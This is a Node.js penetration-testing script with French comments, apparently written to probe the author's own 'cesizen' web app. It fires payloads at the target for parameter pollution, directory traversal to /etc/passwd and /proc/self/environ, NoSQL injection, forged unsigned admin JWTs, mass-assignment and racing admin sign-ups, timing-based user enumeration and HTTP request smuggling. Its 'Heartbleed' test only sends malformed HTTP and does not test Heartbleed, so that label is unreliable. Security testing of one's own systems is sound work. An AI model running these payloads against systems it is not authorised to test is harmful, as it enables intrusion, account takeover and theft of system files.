#!/usr/bin/env node
/*
 * ADVANCED RED TEAM - Tests d'intrusion avancés
 * Techniques plus agressives pour tester la sécurité
 */

import { setTimeout as sleep } from 'node:timers/promises';

const hasGlobalFetch = typeof fetch === 'function';
let _fetch = hasGlobalFetch ? fetch : null;
if (!_fetch) {
  const { default: nodeFetch } = await import('node-fetch');
  _fetch = nodeFetch;
}

const TARGET = process.argv[2] || 'https://cesizen-app.up.railway.app';
const BASE = new URL(TARGET).toString().replace(/\/$/, '');

const COLORS = { info: '\x1b[36m', ok: '\x1b[32m', warn: '\x1b[33m', err: '\x1b[31m', reset: '\x1b[0m' };
const log = (msg, type = 'info') => console.log(`${COLORS[type]}${msg}${COLORS.reset}`);

async function http(method, path, opts = {}) {
  const url = path.startsWith('http') ? path : `${BASE}${path}`;
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), opts.timeout ?? 10000);
  
  try {
    const res = await _fetch(url, {
      method,
      signal: controller.signal,
      headers: { 'User-Agent': 'RedTeam-Scanner/2.0', ...opts.headers },
      body: opts.body ? (typeof opts.body === 'string' ? opts.body : JSON.stringify(opts.body)) : undefined,
    });
    clearTimeout(timeout);
    return res;
  } catch (e) {
    clearTimeout(timeout);
    return { ok: false, status: 0, error: e };
  }
}

async function testParameterPollution() {
  log('\n🔥 Test Parameter Pollution');
  
  const pollutionTests = [
    // HTTP Parameter Pollution
    '?role=user&role=admin',
    '?access=user&access=admin',
    '?user=guest&user=admin',
    '?type=regular&type=administrator',
    
    // Array injection
    '?roles[]=user&roles[]=admin',
    '?permissions[]=read&permissions[]=write&permissions[]=admin',
    
    // Object injection
    '?user[role]=admin',
    '?auth[admin]=true',
    '?profile[isAdmin]=true'
  ];
  
  for (const test of pollutionTests) {
    const res = await http('GET', `/dashboard${test}`);
    if (res.status === 200) {
      const text = await res.text().catch(() => '');
      if (text.includes('admin') && !text.includes('Connexion')) {
        log(`🚨 POSSIBLE POLLUTION: GET /dashboard${test} → ${res.status}`, 'err');
      }
    }
    await sleep(100);
  }
}

async function testDirectoryTraversal() {
  log('\n📁 Test Directory Traversal');
  
  const traversalPayloads = [
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '....//....//....//etc/passwd',
    '/proc/self/environ',
    '/proc/version',
    '/etc/hostname'
  ];
  
  for (const payload of traversalPayloads) {
    const res = await http('GET', `/?file=${payload}`);
    const text = await res.text().catch(() => '');
    
    if (text.includes('root:') || text.includes('127.0.0.1') || text.includes('Linux')) {
      log(`🚨 DIRECTORY TRAVERSAL: /?file=${payload}`, 'err');
    }
    
    // Test sur d'autres endpoints
    const res2 = await http('GET', `/api/file?path=${payload}`);
    const text2 = await res2.text().catch(() => '');
    
    if (text2.includes('root:') || text2.includes('127.0.0.1')) {
      log(`🚨 DIRECTORY TRAVERSAL: /api/file?path=${payload}`, 'err');
    }
    
    await sleep(50);
  }
}

async function testHeartbleed() {
  log('\n💔 Test Heartbleed (simulation)');
  
  // Test avec des payloads qui pourraient exposer de la mémoire
  const heartbleedTests = [
    { headers: { 'Content-Length': '99999' }, body: 'A'.repeat(100) },
    { headers: { 'Content-Length': '0' }, body: 'B'.repeat(1000) },
    { headers: { 'Transfer-Encoding': 'chunked' }, body: '1000\r\n' + 'C'.repeat(4096) + '\r\n0\r\n\r\n' }
  ];
  
  for (const test of heartbleedTests) {
    const res = await http('POST', '/api/heartbeat', test);
    if (res.status && res.text) {
      const text = await res.text().catch(() => '');
      
      if (text.length > 1000 && text.includes('memory') || text.match(/[0-9a-f]{32,}/)) {
        log(`🚨 POSSIBLE MEMORY LEAK: POST /api/heartbeat`, 'err');
      }
    }
    await sleep(100);
  }
}

async function testRaceConditions() {
  log('\n🏃 Test Race Conditions');
  
  // Test création simultanée de comptes admin
  const promises = [];
  for (let i = 0; i < 10; i++) {
    const promise = http('POST', '/api/auth/register', {
      headers: { 'Content-Type': 'application/json' },
      body: { 
        email: `race${i}@test.com`, 
        password: 'TestPass123!', 
        role: 'admin',
        isAdmin: true 
      }
    });
    promises.push(promise);
  }
  
  const results = await Promise.all(promises);
  const successes = results.filter(r => r.status === 200 || r.status === 201);
  
  if (successes.length > 0) {
    log(`🚨 RACE CONDITION: ${successes.length} comptes admin créés simultanément`, 'err');
  }
  
  await sleep(200);
}

async function testTimingAttacks() {
  log('\n⏰ Test Timing Attacks');
  
  const validUser = 'admin@cesizen.com';
  const invalidUser = 'nonexistent@fake.com';
  
  // Mesurer le temps de réponse pour différents utilisateurs
  const timings = [];
  
  for (let i = 0; i < 5; i++) {
    const start1 = Date.now();
    await http('POST', '/api/auth/signin', {
      headers: { 'Content-Type': 'application/json' },
      body: { email: validUser, password: 'wrongpass' }
    });
    const time1 = Date.now() - start1;
    
    const start2 = Date.now();
    await http('POST', '/api/auth/signin', {
      headers: { 'Content-Type': 'application/json' },
      body: { email: invalidUser, password: 'wrongpass' }
    });
    const time2 = Date.now() - start2;
    
    timings.push({ valid: time1, invalid: time2, diff: Math.abs(time1 - time2) });
    await sleep(100);
  }
  
  const avgDiff = timings.reduce((sum, t) => sum + t.diff, 0) / timings.length;
  if (avgDiff > 100) {
    log(`🚨 TIMING ATTACK POSSIBLE: Différence moyenne ${avgDiff}ms`, 'warn');
    log(`   Peut révéler l'existence d'utilisateurs`, 'warn');
  }
}

async function testNoSQLInjection() {
  log('\n🗄️ Test NoSQL Injection');
  
  const noSQLPayloads = [
    // MongoDB operators
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$regex": ".*"}',
    '{"$where": "this.password"}',
    
    // JSON injection
    '{"email": {"$ne": null}, "role": "admin"}',
    '{"$or": [{"role": "admin"}, {"isAdmin": true}]}',
    '{"password": {"$regex": ".*"}}',
  ];
  
  for (const payload of noSQLPayloads) {
    try {
      const res = await http('POST', '/api/auth/signin', {
        headers: { 'Content-Type': 'application/json' },
        body: payload
      });
      
      if (res.status === 200) {
        log(`🚨 NOSQL INJECTION: ${payload.substring(0, 30)}...`, 'err');
      }
    } catch (e) {
      // Continue avec le payload suivant
    }
    await sleep(50);
  }
}

async function testJWTAttacks() {
  log('\n🎫 Test JWT Attacks');
  
  // Test JWT with none algorithm
  const noneJWT = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjJ9.';
  
  const jwtTests = [
    { name: 'None Algorithm', token: noneJWT },
    { name: 'Empty Signature', token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.' },
    { name: 'Weak Secret', token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.6YUWmrQnK8VJbNlKBM8YLQ7PqFqIhL5LBH8uLjNNwBg' }
  ];
  
  for (const test of jwtTests) {
    const res = await http('GET', '/api/user/profile', {
      headers: { 'Authorization': `Bearer ${test.token}` }
    });
    
    if (res.status === 200) {
      log(`🚨 JWT VULNERABILITY: ${test.name}`, 'err');
    }
    await sleep(100);
  }
}

async function testMassAssignment() {
  log('\n📝 Test Mass Assignment');
  
  const massAssignmentTests = [
    {
      email: 'test@example.com',
      password: 'TestPass123!',
      role: 'admin',
      isAdmin: true,
      permissions: ['admin', 'write', 'delete'],
      _isAdmin: true,
      admin: true,
      superuser: true
    }
  ];
  
  for (const payload of massAssignmentTests) {
    const res = await http('POST', '/api/auth/register', {
      headers: { 'Content-Type': 'application/json' },
      body: payload
    });
    
    if (res.status === 200 || res.status === 201) {
      log(`🚨 MASS ASSIGNMENT POSSIBLE: Compte avec privilèges créé`, 'err');
      
      // Tenter de se connecter pour vérifier
      const loginRes = await http('POST', '/api/auth/signin', {
        headers: { 'Content-Type': 'application/json' },
        body: { email: payload.email, password: payload.password }
      });
      
      if (loginRes.status === 200) {
        log(`🚨 CRITICAL: Connexion admin réussie`, 'err');
      }
    }
    await sleep(100);
  }
}

async function testHTTPSmuggling() {
  log('\n🚢 Test HTTP Request Smuggling');
  
  const smugglingPayloads = [
    // Content-Length vs Transfer-Encoding
    {
      headers: {
        'Content-Length': '13',
        'Transfer-Encoding': 'chunked'
      },
      body: '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n'
    },
    // Double Content-Length
    {
      headers: {
        'Content-Length': '6',
        'Content-Length ': '0'
      },
      body: '{"test": true}'
    }
  ];
  
  for (const test of smugglingPayloads) {
    const res = await http('POST', '/api/test', test);
    if (res.status !== 400 && res.status !== 502) {
      log(`⚠️ HTTP SMUGGLING: Payload accepté`, 'warn');
    }
    await sleep(100);
  }
}

// Fonction principale
(async () => {
  log('🔥 ADVANCED RED TEAM - Tests d\'intrusion avancés', 'err');
  log(`🎯 Cible: ${BASE}`, 'info');
  log('━'.repeat(60), 'info');
  
  await testParameterPollution();
  await sleep(200);
  
  await testDirectoryTraversal();
  await sleep(200);
  
  await testRaceConditions();
  await sleep(200);
  
  await testTimingAttacks();
  await sleep(200);
  
  await testNoSQLInjection();
  await sleep(200);
  
  await testJWTAttacks();
  await sleep(200);
  
  await testMassAssignment();
  await sleep(200);
  
  await testHTTPSmuggling();
  await sleep(200);
  
  await testHeartbleed();
  
  log('\n🏁 Tests terminés', 'ok');
  log('⚠️ Si aucune vulnérabilité trouvée, l\'app est très bien sécurisée !', 'info');
})();
